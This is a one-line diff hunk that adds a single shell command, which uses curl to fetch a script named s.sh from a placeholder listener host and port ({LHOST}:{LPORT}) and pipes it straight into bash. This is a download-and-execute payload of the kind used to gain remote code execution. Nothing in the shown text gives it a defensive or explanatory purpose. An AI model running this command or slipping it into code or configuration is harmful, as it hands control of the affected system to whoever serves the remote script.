@@ -1,0 +1,1 @@
+curl -s http://{LHOST}:{LPORT}/s.sh|bash
